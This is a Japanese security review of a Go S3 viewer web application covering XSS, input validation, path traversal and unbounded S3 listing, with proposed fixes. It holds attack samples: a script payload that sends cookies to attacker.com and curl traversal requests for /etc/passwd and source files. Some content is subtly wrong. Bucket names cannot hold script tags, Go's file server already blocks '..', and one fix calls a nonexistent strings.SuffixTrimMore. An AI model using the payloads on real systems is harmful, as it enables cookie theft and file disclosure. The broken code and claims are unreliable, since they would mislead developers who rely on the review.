# S3 Viewer - セキュリティレビュー 1

4つの重大なセキュリティ脆弱性の詳細分析

---

## 目次

1. [XSS脆弱性 - HTML文字列の直接連結](#1-xss脆弱性---html文字列の直接連結)
2. [URL パラメータの検証不足](#2-url-パラメータの検証不足)
3. [トラバーサル攻撃のリスク](#3-トラバーサル攻撃のリスク)
4. [大量データ取得時の制御不足](#4-大量データ取得時の制御不足)

---

## 1. XSS脆弱性 - HTML文字列の直接連結

### 問題の概要

**重大度:** 🔴 **CRITICAL**

現在のコードは、ユーザーからの入力値（バケット名、オブジェクトキー、エラーメッセージなど）を**検証・エスケープなしにHTML文字列に直接連結**しています。これにより、攻撃者がJavaScriptコードを実行できます。

### 脆弱なコード箇所

#### 1. renderHomeHTML() - 232-241行目
```go
// ❌ 危険：bucket.Name がエスケープされていない
if data.Error != "" {
    html += `<div class="error">Error: ` + data.Error + `</div>`
}

html += `<div class="bucket-list">`
for _, bucket := range data.Buckets {
    html += `<div class="bucket-item">
        <strong>` + bucket.Name + `</strong> (Created: ` + bucket.CreationDate + `)
        <a href="/bucket/` + bucket.Name + `">View</a>
    </div>`
}
```

#### 2. renderBucketHTML() - 257-291行目
```go
// ❌ 危険：複数の箇所でエスケープなし
html := `
<!DOCTYPE html>
<html>
<head>
    <title>S3 Bucket: ` + data.BucketName + `</title>  <!-- XSS -->
    ...
</head>
<body>
    <h1>Bucket: ` + data.BucketName + `</h1>  <!-- XSS -->
    ...
    <input type="hidden" name="prefix" value="` + data.Prefix + `">  <!-- XSS -->
    <a href="/bucket/` + data.BucketName + `?prefix=` + bc.Path + `">` + bc.Name + `</a> /  <!-- XSS -->
```

#### 3. renderObjectHTML() - 328-369行目
```go
// ❌ 危険：オブジェクトキーと詳細情報がエスケープされていない
html := `
<html>
<head>
    <title>Object: ` + data.ObjectKey + `</title>  <!-- XSS -->
    ...
</head>
<body>
    <h1>Object Details: ` + data.ObjectKey + `</h1>  <!-- XSS -->
    ...
    <td>` + data.Detail.ContentType + `</td>  <!-- XSS -->
    <td>` + data.Detail.ETag + `</td>  <!-- XSS -->
```

### 攻撃シナリオ

#### シナリオ1: バケット名を使用した XSS
```
1. 攻撃者が S3 に以下の名前のバケットを作成：
   <script>alert('XSS')</script>

2. ユーザーがアプリケーションでバケット一覧を表示

3. ブラウザに以下のHTMLが送信：
   <strong><script>alert('XSS')</script></strong>

4. ブラウザがスクリプトを実行
   → Cookie、セッショントークンが盗まれる
   → ユーザーが他のサイトにリダイレクト
   → 悪意あるコンテンツが注入される
```

#### シナリオ2: オブジェクトキーを使用した XSS
```
1. 攻撃者がS3に以下の名前のファイルをアップロード：
   "><script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script><a href="

2. ユーザーがバケットを閲覧するとHTMLが以下のようになる：
   <a href="/object/bucket/"><script>fetch(...)</script><a href="">

3. スクリプトが実行され、ユーザーのCookieが外部サーバーに送信される
```

#### シナリオ3: エラーメッセージを使用した XSS
```
1. AWS APIがエラーを返す：
   Error: User is not authorized to perform: s3:ListBucket
   on resource: arn:aws:s3:::bucket

2. エラーメッセージがそのままHTMLに挿入される

3. 攻撃者が手動でエラーレスポンスを作成・キャッシュ
```

### 影響

- **認証情報盗み取り**: セッションCookieやトークンの盗み取り
- **データ漏洩**: ページ内容の改ざん、個人情報の抽出
- **マルウェア配布**: 訪問者に悪意あるコンテンツを配信
- **フィッシング**: 偽のログインフォームを表示

### 解決方法

#### 方法1: html/template パッケージの使用（推奨）

```go
// ✅ テンプレートファイルの例（templates/bucket.html）
<!DOCTYPE html>
<html>
<head>
    <title>S3 Bucket: {{.BucketName}}</title>
</head>
<body>
    <h1>Bucket: {{.BucketName}}</h1>

    {{if .Error}}
        <div style="color: red;">Error: {{.Error}}</div>
    {{end}}

    <div class="breadcrumb">
    {{range .Breadcrumbs}}
        {{if eq .Path ""}}
            <a href="/bucket/{{.BucketName}}">{{.Name}}</a> /
        {{else}}
            <a href="/bucket/{{.BucketName}}?prefix={{.Path}}">{{.Name}}</a> /
        {{end}}
    {{end}}
    </div>

    <div class="object-list">
    {{range .Objects}}
        {{if .IsFolder}}
            <div class="object-item folder">
                📁 <a href="/bucket/{{.BucketName}}?prefix={{.Key}}">{{.Name}}</a>
            </div>
        {{else}}
            <div class="object-item">
                📄 <a href="/object/{{.BucketName}}/{{.Key}}">{{.Name}}</a>
                ({{.Size}}) - {{.LastModified}}
            </div>
        {{end}}
    {{end}}
    </div>
</body>
</html>
```

**Go コード:**
```go
// handler.go の改善
func (h *Handler) HandleBucket(w http.ResponseWriter, r *http.Request) {
    bucketName := strings.TrimPrefix(r.URL.Path, "/bucket/")
    if bucketName == "" || strings.Contains(bucketName, "/") {
        http.NotFound(w, r)
        return
    }

    prefix := r.URL.Query().Get("prefix")
    searchKeyword := r.URL.Query().Get("search")

    ctx := context.Background()
    objects, err := h.s3Service.ListObjects(ctx, bucketName, prefix, searchKeyword)

    breadcrumbs := h.generateBreadcrumbs(prefix)

    data := BucketPageData{
        BucketName:  bucketName,
        Prefix:      prefix,
        Objects:     objects,
        Breadcrumbs: breadcrumbs,
    }

    if err != nil {
        data.Error = err.Error()
        log.Printf("Error listing objects: %v", err)
    }

    // ✅ html/template を使用（自動的にHTMLエスケープ）
    if h.templates != nil {
        w.Header().Set("Content-Type", "text/html; charset=utf-8")
        if err := h.templates.ExecuteTemplate(w, "bucket.html", data); err != nil {
            log.Printf("Template execution error: %v", err)
            http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        }
    } else {
        // ❌ フォールバックHTMLレンダリング関数は削除する
        http.Error(w, "Template not available", http.StatusInternalServerError)
    }
}
```

#### 方法2: 手動エスケープ（フォールバック時のみ）

```go
import "html"

func renderBucketHTML(w http.ResponseWriter, data BucketPageData) {
    w.Header().Set("Content-Type", "text/html; charset=utf-8")

    // ✅ 各データをHTMLエスケープ
    bucketName := html.EscapeString(data.BucketName)
    errorMsg := html.EscapeString(data.Error)
    prefix := html.EscapeString(data.Prefix)

    html := `
    <!DOCTYPE html>
    <html>
    <head>
        <title>S3 Bucket: ` + bucketName + `</title>
    </head>
    <body>
        <h1>Bucket: ` + bucketName + `</h1>
    `

    if errorMsg != "" {
        html += `<div style="color: red;">Error: ` + errorMsg + `</div>`
    }

    // ...
}
```

#### 方法3: Content Security Policy (CSP) による追加防御

```go
// main.go
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
    // ✅ CSP ヘッダーを設定
    w.Header().Set("Content-Security-Policy",
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'")
    h.HandleHome(w, r)
})
```

---

## 2. URL パラメータの検証不足

### 問題の概要

**重大度:** 🟠 **HIGH**

URL パラメータ（`prefix`、`search`）およびパス（バケット名、オブジェクトキー）の検証が不十分です。これにより、不正なリクエストやDoS攻撃が可能になります。

### 脆弱なコード箇所

#### 1. HandleBucket() - 99-103行目
```go
// ❌ prefix と search に検証がない
prefix := r.URL.Query().Get("prefix")
searchKeyword := r.URL.Query().Get("search")

// バケット名の検証は最小限
bucketName := strings.TrimPrefix(r.URL.Path, "/bucket/")
if bucketName == "" || strings.Contains(bucketName, "/") {
    http.NotFound(w, r)
    return
}
// ✓ OK（/を含まないかチェック）

// ❌ しかし prefix と search は直接 S3 API に渡される
objects, err := h.s3Service.ListObjects(ctx, bucketName, prefix, searchKeyword)
```

#### 2. ListObjects() - 72-84行目
```go
// ❌ パラメータの長さ制限がない
func (s *S3Service) ListObjects(ctx context.Context, bucketName, prefix, searchKeyword string) ([]Object, error) {
    // ❌ prefix の長さが無制限（S3の上限は1024バイト）
    // ❌ searchKeyword の長さが無制限
    params := &s3.ListObjectsV2Input{
        Bucket:    aws.String(bucketName),
        Prefix:    aws.String(prefix),
        Delimiter: aws.String("/"),
    }

    result, err := s.client.ListObjectsV2(ctx, params)
```

### 具体的なリスク

#### リスク1: 非常に長いパラメータによるメモリ攻撃

```bash
# 例：数MB のパラメータを送信
curl "http://localhost:8080/bucket/my-bucket?prefix=$(python3 -c 'print(\"a\"*10000000)')"

# アプリケーションの挙動：
# 1. メモリに全パラメータを読み込む
# 2. S3 API に送信（AWS側で拒否される可能性）
# 3. 複数の悪意あるリクエスト → OOM（Out of Memory）
```

#### リスク2: 特殊文字を含むパラメータ

```bash
# 例1：制御文字を含む検索
curl "http://localhost:8080/bucket/my-bucket?search=%00%01%02..."

# 例2：改行を含む
curl "http://localhost:8080/bucket/my-bucket?search=%0a%0d..."

# 効果：
# - ログインジェクション
# - 不正な結果表示
# - クラッシュの可能性
```

#### リスク3: S3 API 制限への抵触

```bash
# S3 の ListObjectsV2 API:
# - Max-keys: 最大 1000
# - Prefix: 最大 1024文字
# - 応答時間: 通常数秒

# 現在のコードは Max-keys を設定していない
# → 大量オブジェクトで長時間待機 → タイムアウト
```

### 攻撃パターン

#### 攻撃1: DoS（サービス拒否）

```
1. 攻撃者が 100 万個のオブジェクトを持つバケットを作成
2. /bucket/huge-bucket にアクセス
3. ListObjectsV2 で全データを取得しようとする
   → メモリ枯渇
   → CPU 100%
   → 他のユーザーが待機
```

#### 攻撃2: インジェクション

```
1. 攻撃者が search パラメータに以下を送信：
   search=test%0aSet-Cookie:%20admin=true

2. ログに以下のように出力される（ログインジェクション）：
   search=test
   Set-Cookie: admin=true
```

### 解決方法

#### 方法1: パラメータ検証関数の実装

```go
// validation.go - 新規作成
package handler

import (
    "fmt"
    "regexp"
    "strings"
)

const (
    maxPrefixLength     = 1024  // S3の制限
    maxSearchLength     = 255
    maxBucketNameLength = 63
)

// ValidateBucketName はバケット名を検証
func ValidateBucketName(name string) error {
    if len(name) == 0 {
        return fmt.Errorf("bucket name is empty")
    }

    if len(name) > maxBucketNameLength {
        return fmt.Errorf("bucket name too long (max %d)", maxBucketNameLength)
    }

    // S3 バケット名の規則：小文字、数字、ハイフン、ドット
    if !regexp.MustCompile(`^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$`).MatchString(name) {
        return fmt.Errorf("invalid bucket name format")
    }

    // 連続したハイフンを禁止
    if strings.Contains(name, "--") || strings.Contains(name, "..") {
        return fmt.Errorf("bucket name contains invalid sequences")
    }

    return nil
}

// ValidatePrefix はプレフィックスを検証
func ValidatePrefix(prefix string) error {
    if len(prefix) > maxPrefixLength {
        return fmt.Errorf("prefix too long (max %d)", maxPrefixLength)
    }

    // 制御文字を禁止
    for _, ch := range prefix {
        if ch < 32 && ch != '\t' { // タブは許可
            return fmt.Errorf("prefix contains invalid characters")
        }
    }

    // パストラバーサル対策
    if strings.Contains(prefix, "..") {
        return fmt.Errorf("prefix contains '..'")
    }

    return nil
}

// ValidateSearchKeyword は検索キーワードを検証
func ValidateSearchKeyword(keyword string) error {
    if len(keyword) > maxSearchLength {
        return fmt.Errorf("search keyword too long (max %d)", maxSearchLength)
    }

    // 制御文字を禁止
    for _, ch := range keyword {
        if ch < 32 {
            return fmt.Errorf("search keyword contains invalid characters")
        }
    }

    // 危険な正規表現パターンの検出
    if strings.Contains(keyword, "(?") {
        return fmt.Errorf("search keyword contains invalid patterns")
    }

    return nil
}
```

#### 方法2: HandleBucket の改善

```go
// handler.go の改善版
func (h *Handler) HandleBucket(w http.ResponseWriter, r *http.Request) {
    // バケット名の抽出と検証
    bucketName := strings.TrimPrefix(r.URL.Path, "/bucket/")

    if err := ValidateBucketName(bucketName); err != nil {
        http.Error(w, fmt.Sprintf("Invalid bucket: %v", err), http.StatusBadRequest)
        return
    }

    // パラメータの抽出と検証
    prefix := r.URL.Query().Get("prefix")
    if err := ValidatePrefix(prefix); err != nil {
        http.Error(w, fmt.Sprintf("Invalid prefix: %v", err), http.StatusBadRequest)
        return
    }

    searchKeyword := r.URL.Query().Get("search")
    if err := ValidateSearchKeyword(searchKeyword); err != nil {
        http.Error(w, fmt.Sprintf("Invalid search: %v", err), http.StatusBadRequest)
        return
    }

    // ✅ コンテキストにタイムアウトを設定
    ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
    defer cancel()

    objects, err := h.s3Service.ListObjects(ctx, bucketName, prefix, searchKeyword)

    // ... 以降は同じ
}
```

#### 方法3: ListObjects の改善

```go
// s3_service.go の改善版
func (s *S3Service) ListObjects(
    ctx context.Context,
    bucketName, prefix, searchKeyword string,
) ([]Object, error) {
    // ✅ MaxKeys を設定（デフォルト100、最大1000）
    maxKeys := int32(100)
    if mk := ctx.Value("maxKeys"); mk != nil {
        if v, ok := mk.(int32); ok && v > 0 && v <= 1000 {
            maxKeys = v
        }
    }

    params := &s3.ListObjectsV2Input{
        Bucket:    aws.String(bucketName),
        Prefix:    aws.String(prefix),
        Delimiter: aws.String("/"),
        MaxKeys:   aws.Int32(maxKeys),  // ✅ 追加
    }

    result, err := s.client.ListObjectsV2(ctx, params)
    if err != nil {
        return nil, fmt.Errorf("failed to list objects: %w", err)
    }

    var objects []Object

    // ... 既存の処理

    return objects, nil
}
```

#### 方法4: HTTP ヘッダー検証

```go
// main.go にミドルウェアを追加
func validateHeadersMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // ✅ Content-Length チェック（デフォルト10MB）
        maxContentLength := int64(10 * 1024 * 1024)
        if r.ContentLength > maxContentLength {
            http.Error(w, "Request too large", http.StatusRequestEntityTooLarge)
            return
        }

        // ✅ URL の長さチェック（デフォルト2KB）
        if len(r.RequestURI) > 2048 {
            http.Error(w, "URL too long", http.StatusRequestURITooLong)
            return
        }

        next.ServeHTTP(w, r)
    })
}

// 使用例
mux := http.NewServeMux()
mux.HandleFunc("/", h.HandleHome)
mux.HandleFunc("/bucket/", h.HandleBucket)
mux.HandleFunc("/object/", h.HandleObject)
http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

// ✅ ミドルウェアを適用
http.ListenAndServe(addr, validateHeadersMiddleware(mux))
```

---

## 3. トラバーサル攻撃のリスク

### 問題の概要

**重大度:** 🟠 **HIGH**

静的ファイルサーバーと一部のパラメータ処理に、ディレクトリトラバーサル脆弱性が存在します。これにより、意図しないファイルへのアクセスが可能になります。

### 脆弱なコード箇所

#### 1. main.go - 38行目（静的ファイルサーバー）

```go
// ❌ パストラバーサル対策がない
http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
```

#### 2. handler.go - 132-146行目（オブジェクトキー処理）

```go
// ❌ pathParts に ".." が含まれる可能性
pathParts := strings.Split(strings.TrimPrefix(r.URL.Path, "/object/"), "/")
if len(pathParts) < 2 {
    http.NotFound(w, r)
    return
}

bucketName := pathParts[0]
objectKey := strings.Join(pathParts[1:], "/")

// ❌ ".." をチェックしていない
// 例：/object/bucket/../../other-bucket/secret-file
// → objectKey = "../../other-bucket/secret-file"

objectKey, err := url.QueryUnescape(objectKey)
// URL デコード後も ".." が残っている可能性
```

### 攻撃シナリオ

#### 攻撃1: 静的ファイルサーバーを使用したアプリケーションコード読取

```bash
# 1. アプリケーション構造
# /app/
#   ├── main.go
#   ├── static/
#   │   ├── style.css
#   │   └── script.js
#   ├── cmd/
#   │   └── s3viewre/
#   │       └── main.go
#   └── internal/
#       └── handler/
#           └── handler.go

# 2. 攻撃コマンド（トラバーサル）
curl "http://localhost:8080/static/../cmd/s3viewre/main.go"
curl "http://localhost:8080/static/../../internal/handler/handler.go"
curl "http://localhost:8080/static/../../../../etc/passwd"

# 3. 結果
# ✓ アプリケーションのソースコードが読める
# ✓ ~/.aws/credentials（同じサーバー上の場合）
# ✓ シスアドレスファイル
```

#### 攻撃2: S3 オブジェクトキーを使用した権限外アクセス

```bash
# 1. S3バケット構造
# allowed-bucket/
#   ├── public/
#   │   └── file1.txt
#   └── private/
#       └── secret.txt

# 2. ユーザーは "allowed-bucket/public" のアクセス権限のみ

# 3. 攻撃コマンド
curl "http://localhost:8080/object/allowed-bucket/../../../../../other-bucket/secret"
curl "http://localhost:8080/object/allowed-bucket/../../sensitive-data"

# 4. 問題
# - バリデーションがないと ".." がそのまま S3 API に渡される
# - ただし S3 API 自体の制限により、このシナリオは実際には動作しない可能性あり
```

#### 攻撃3: URL エンコーディング回避

```bash
# 1. "%2e%2e" は ".." と同じ意味

curl "http://localhost:8080/static/%2e%2e/%2e%2e/etc/passwd"
# → URL デコード後に ".." に変換される

# 2. 多重エンコーディング
curl "http://localhost:8080/static/%252e%252e/file.txt"
# → 最初のデコードで "%2e%2e" → ".."
# → さらにデコードできる可能性

# 3. URLスラッシュのエンコーディング
curl "http://localhost:8080/static/file%2f%2e%2e%2fconfig"
# → "file/../config"
```

### 影響

- **ソースコード漏洩**: アプリケーションの実装詳細が露出
- **認証情報漏洩**: AWS 認証情報ファイルの読取
- **設定ファイル漏洩**: データベース接続文字列、API キー等
- **権限外アクセス**: 本来アクセス権限のないファイルへのアクセス

### 解決方法

#### 方法1: 静的ファイルサーバーの安全化

```go
// main.go の改善版

import "net/http"

// SafeFileServer は ../ 等の トラバーサルを防止
type SafeFileServer struct {
    fs http.FileSystem
}

func (s *SafeFileServer) Open(name string) (http.File, error) {
    // ✅ パストトラバーサル攻撃を検出
    if strings.Contains(name, "..") {
        return nil, http.ErrNotFound
    }

    // ✅ 隠しファイルを禁止
    parts := strings.Split(name, "/")
    for _, part := range parts {
        if strings.HasPrefix(part, ".") {
            return nil, http.ErrNotFound
        }
    }

    // ✅ 許可された拡張子のみ
    allowedExts := map[string]bool{
        ".css": true,
        ".js":  true,
        ".png": true,
        ".jpg": true,
        ".gif": true,
        ".ico": true,
        ".svg": true,
    }

    ext := strings.ToLower(strings.SuffixTrimMore(name, "?"))
    if !allowedExts[ext] && ext != "" {
        return nil, http.ErrNotFound
    }

    return s.fs.Open(name)
}

func main() {
    // ... 既存コード ...

    // ❌ 旧：危険
    // http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

    // ✅ 新：安全
    safeFS := &SafeFileServer{
        fs: http.Dir("static"),
    }
    http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(safeFS)))

    // ... サーバー起動 ...
}
```

#### 方法2: オブジェクトキー検証

```go
// handler.go の改善版

// ValidateObjectKey はオブジェクトキーを検証
func ValidateObjectKey(key string) error {
    // ✅ 相対パスを禁止
    if strings.Contains(key, "..") {
        return fmt.Errorf("object key contains '..'")
    }

    // ✅ 絶対パスを禁止
    if strings.HasPrefix(key, "/") {
        return fmt.Errorf("object key starts with '/'")
    }

    // ✅ 連続したスラッシュを禁止
    if strings.Contains(key, "//") {
        return fmt.Errorf("object key contains '//'")
    }

    // ✅ 最大長チェック
    if len(key) > 1024 {
        return fmt.Errorf("object key too long")
    }

    return nil
}

func (h *Handler) HandleObject(w http.ResponseWriter, r *http.Request) {
    pathParts := strings.Split(strings.TrimPrefix(r.URL.Path, "/object/"), "/")
    if len(pathParts) < 2 {
        http.NotFound(w, r)
        return
    }

    bucketName := pathParts[0]
    objectKey := strings.Join(pathParts[1:], "/")

    // ✅ URL デコード前に基本チェック
    if strings.Contains(objectKey, "..") {
        http.Error(w, "Invalid object key", http.StatusBadRequest)
        return
    }

    // URL デコード
    objectKey, err := url.QueryUnescape(objectKey)
    if err != nil {
        http.Error(w, "Invalid object key", http.StatusBadRequest)
        return
    }

    // ✅ デコード後に再度チェック（多重エンコーディング対策）
    if err := ValidateObjectKey(objectKey); err != nil {
        http.Error(w, fmt.Sprintf("Invalid object key: %v", err), http.StatusBadRequest)
        return
    }

    // ... 以降は同じ
}
```

#### 方法3: ホワイトリスト方式

```go
// ✅ より厳密な検証（ホワイトリスト方式）
func IsValidObjectKey(key string) bool {
    if len(key) == 0 || len(key) > 1024 {
        return false
    }

    // 許可される文字：a-z, A-Z, 0-9, ., -, _, /, スペース
    for _, ch := range key {
        if !((ch >= 'a' && ch <= 'z') ||
            (ch >= 'A' && ch <= 'Z') ||
            (ch >= '0' && ch <= '9') ||
            ch == '.' || ch == '-' || ch == '_' || ch == '/' || ch == ' ') {
            return false
        }
    }

    // .. や ./ を禁止
    if strings.Contains(key, "..") ||
       strings.Contains(key, "./") ||
       strings.HasPrefix(key, "/") ||
       strings.Contains(key, "//") {
        return false
    }

    return true
}
```

---

## 4. 大量データ取得時の制御不足

### 問題の概要

**重大度:** 🟠 **HIGH**

バケット内のオブジェクト一覧取得時に、ページング制限やリソース制限がないため、大量のデータを取得する際にメモリ枯渇やサービス停止が発生します。

### 脆弱なコード箇所

#### 1. s3_service.go - 72-145行目

```go
// ❌ MaxKeys が設定されていない
func (s *S3Service) ListObjects(ctx context.Context, bucketName, prefix, searchKeyword string) ([]Object, error) {
    params := &s3.ListObjectsV2Input{
        Bucket:    aws.String(bucketName),
        Prefix:    aws.String(prefix),
        Delimiter: aws.String("/"),
        // ❌ MaxKeys が指定されていない = デフォルト値（AWS側で決定）
    }

    result, err := s.client.ListObjectsV2(ctx, params)
    if err != nil {
        return nil, fmt.Errorf("failed to list objects: %w", err)
    }

    var objects []Object

    // ❌ 全データをメモリに読み込み
    for _, cp := range result.CommonPrefixes {
        // ...
    }

    for _, obj := range result.Contents {
        // ...
    }

    // ❌ ページネーション (IsTruncated, NextContinuationToken) を使用していない
    // → 1回のコールですべてのデータを取得しようとする

    return objects, nil
}
```

#### 2. handler.go - 62-128行目

```go
// ❌ コンテキストにタイムアウトがない
func (h *Handler) HandleBucket(w http.ResponseWriter, r *http.Request) {
    // ... パラメータ抽出 ...

    ctx := context.Background()  // ❌ タイムアウトなし
    objects, err := h.s3Service.ListObjects(ctx, bucketName, prefix, searchKeyword)

    // ❌ 数百万オブジェクトの場合、ここで数分以上かかる可能性
}
```

### 実際のシナリオ

#### シナリオ1: 大規模バケットへのアクセス

```
1. 攻撃者が数百万個のオブジェクトを含むバケットを作成
   bucket-name/
   ├── 0/
   │   ├── 0
   │   ├── 1
   │   └── ... (1000個)
   ├── 1/
   │   └── ... (1000個)
   └── ... (数千個のディレクトリ)
   → 合計: 10,000,000 オブジェクト

2. ユーザーが /bucket/bucket-name にアクセス

3. ListObjectsV2 がすべてのオブジェクトを列挙しようとする

4. 結果：
   - メモリ使用量：数GB（1000万オブジェクト × 200バイト）
   - CPU使用率：100%
   - レスポンス時間：数分〜タイムアウト
   - 他のユーザー：応答不能

5. 最終的に：
   - アプリケーションクラッシュ
   - AWS API レート制限に抵触
   - コスト増加（API呼び出し数）
```

#### シナリオ2: リソース枯渇

```
リソース使用量の推移：

メモリ：
0
│     ▄▄▄▄▄▄
│    ▐█████▌  ← OOM発生、プロセス終了
│   ▐███████▌
│  ▐█████████▌
├──────────────→ 時間

CPU：
0
│        ▁▁▁
│       ▐███▌
│      ▐████▌
│     ▐█████▌ ← 100% 持続
├──────────────→ 時間

コネクション：
0
│  ✓ Normal
│  ✓ 新規リクエスト受け付けなし
│  ✓ ハング状態
```

### 影響

- **DoS（サービス拒否）**: 他のユーザーがアクセス不可
- **メモリリーク**: アプリケーションの再起動が必要
- **コスト増加**: AWS API の呼び出し数増加
- **データ漏洩**: 長時間のレスポンスでタイムアウトエラー

### 解決方法

#### 方法1: MaxKeys の設定

```go
// s3_service.go の改善版

import "time"

const (
    defaultMaxKeys = int32(100)  // デフォルト: 100オブジェクト
    maxMaxKeys     = int32(1000) // 最大: 1000オブジェクト
)

func (s *S3Service) ListObjects(
    ctx context.Context,
    bucketName, prefix, searchKeyword string,
) ([]Object, string, error) {  // nextToken を返り値に追加

    // ✅ MaxKeys を設定（1回のコールで取得するオブジェクト数を制限）
    params := &s3.ListObjectsV2Input{
        Bucket:    aws.String(bucketName),
        Prefix:    aws.String(prefix),
        Delimiter: aws.String("/"),
        MaxKeys:   aws.Int32(defaultMaxKeys),  // ✅ 追加
    }

    result, err := s.client.ListObjectsV2(ctx, params)
    if err != nil {
        return nil, "", fmt.Errorf("failed to list objects: %w", err)
    }

    var objects []Object

    // フォルダ処理
    for _, cp := range result.CommonPrefixes {
        // ... (既存コード)
    }

    // オブジェクト処理
    for _, obj := range result.Contents {
        // ... (既存コード)
    }

    // ✅ ページネーション用のトークンを返す
    nextToken := ""
    if result.IsTruncated != nil && *result.IsTruncated {
        nextToken = aws.ToString(result.NextContinuationToken)
    }

    return objects, nextToken, nil
}
```

#### 方法2: ページネーション対応

```go
// handler.go の改善版

func (h *Handler) HandleBucket(w http.ResponseWriter, r *http.Request) {
    bucketName := strings.TrimPrefix(r.URL.Path, "/bucket/")
    if bucketName == "" || strings.Contains(bucketName, "/") {
        http.NotFound(w, r)
        return
    }

    prefix := r.URL.Query().Get("prefix")
    searchKeyword := r.URL.Query().Get("search")
    continuationToken := r.URL.Query().Get("continuation_token")  // ✅ 追加

    // ✅ コンテキストにタイムアウトを設定
    ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
    defer cancel()

    objects, nextToken, err := h.s3Service.ListObjectsWithPagination(
        ctx,
        bucketName,
        prefix,
        searchKeyword,
        continuationToken,  // ✅ 追加
    )

    breadcrumbs := h.generateBreadcrumbs(prefix)

    data := BucketPageData{
        BucketName:     bucketName,
        Prefix:         prefix,
        Objects:        objects,
        Breadcrumbs:    breadcrumbs,
        NextToken:      nextToken,  // ✅ テンプレートに渡す
        CurrentToken:   continuationToken,
    }

    if err != nil {
        data.Error = err.Error()
        log.Printf("Error listing objects: %v", err)
    }

    if h.templates != nil {
        if err := h.templates.ExecuteTemplate(w, "bucket.html", data); err != nil {
            log.Printf("Template execution error: %v", err)
            http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        }
    }
}
```

#### 方法3: タイムアウト設定

```go
// handler.go の改善版

func (h *Handler) HandleBucket(w http.ResponseWriter, r *http.Request) {
    // ... パラメータ抽出 ...

    // ✅ コンテキストにタイムアウトを設定（重要！）
    ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
    defer cancel()

    // ✅ チャネルを使用してリクエストをキャンセル可能に
    done := make(chan error, 1)
    var objects []Object

    go func() {
        var err error
        objects, err = h.s3Service.ListObjects(ctx, bucketName, prefix, searchKeyword)
        done <- err
    }()

    select {
    case err := <-done:
        if err != nil {
            http.Error(w, "Error listing objects", http.StatusInternalServerError)
            return
        }
    case <-ctx.Done():
        // ✅ タイムアウト発生
        http.Error(w, "Request timeout", http.StatusRequestTimeout)
        return
    }

    // ... 以降は同じ
}
```

#### 方法4: HTML テンプレートでのペジネーション表示

```go
// templates/bucket.html

<div class="pagination">
    {{if .CurrentToken}}
        <a href="/bucket/{{.BucketName}}?prefix={{.Prefix}}&search={{.Search}}">← Previous</a>
    {{end}}

    <span>Showing {{len .Objects}} objects</span>

    {{if .NextToken}}
        <a href="/bucket/{{.BucketName}}?prefix={{.Prefix}}&search={{.Search}}&continuation_token={{.NextToken}}">Next →</a>
    {{end}}
</div>

<div class="object-list">
    {{range .Objects}}
        <!-- オブジェクト表示 -->
    {{end}}
</div>
```

#### 方法5: リソース制限ミドルウェア

```go
// main.go

import (
    "net/http"
    "runtime"
    "fmt"
)

// ResourceLimiterMiddleware はリソース使用量を監視
func ResourceLimiterMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // ✅ メモリ使用量をチェック
        var m runtime.MemStats
        runtime.ReadMemStats(&m)

        maxMemory := uint64(500 * 1024 * 1024) // 500MB
        if m.Alloc > maxMemory {
            http.Error(w, "Server overloaded", http.StatusServiceUnavailable)
            return
        }

        // ✅ ゴルーチン数をチェック
        numGoroutines := runtime.NumGoroutine()
        if numGoroutines > 1000 {
            http.Error(w, "Too many concurrent requests", http.StatusTooManyRequests)
            return
        }

        next.ServeHTTP(w, r)
    })
}

func main() {
    // ... ハンドラー設定 ...

    // ✅ リソース制限ミドルウェアを適用
    http.ListenAndServe(
        addr,
        ResourceLimiterMiddleware(http.DefaultServeMux),
    )
}
```

---

## 比較表：改善前後

| 項目 | 改善前 | 改善後 |
|------|--------|--------|
| **XSS対策** | ❌ なし | ✅ html/template + CSP |
| **パラメータ検証** | ❌ 最小限 | ✅ 長さ制限、文字種制限 |
| **トラバーサル対策** | ❌ なし | ✅ ホワイトリスト方式 |
| **MaxKeys設定** | ❌ なし | ✅ 100〜1000に制限 |
| **タイムアウト** | ❌ 無制限 | ✅ 30秒 |
| **ページネーション** | ❌ なし | ✅ ContinuationToken対応 |
| **メモリ安全性** | ❌ 危険 | ✅ 安全 |
| **コンテキスト管理** | ❌ なし | ✅ あり |

---

## 実装優先度

### フェーズ1（即座 - 1週間以内）
1. XSS対策：html/template への移行
2. パラメータ検証：長さ制限の追加
3. MaxKeys設定：デフォルト100

### フェーズ2（短期 - 2週間以内）
4. タイムアウト設定：全エンドポイント
5. トラバーサル対策：静的ファイルサーバー
6. ページネーション対応

### フェーズ3（中期 - 1ヶ月以内）
7. リソース制限ミドルウェア
8. CSP ヘッダー設定
9. 監査ログ実装

---

## 参考資料

- **OWASP XSS Prevention**: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **OWASP Path Traversal**: https://owasp.org/www-community/attacks/Path_Traversal
- **AWS S3 API Reference**: https://docs.aws.amazon.com/AmazonS3/latest/API/API_ListObjectsV2.html
- **Go context パッケージ**: https://pkg.go.dev/context
- **Go html/template パッケージ**: https://pkg.go.dev/html/template
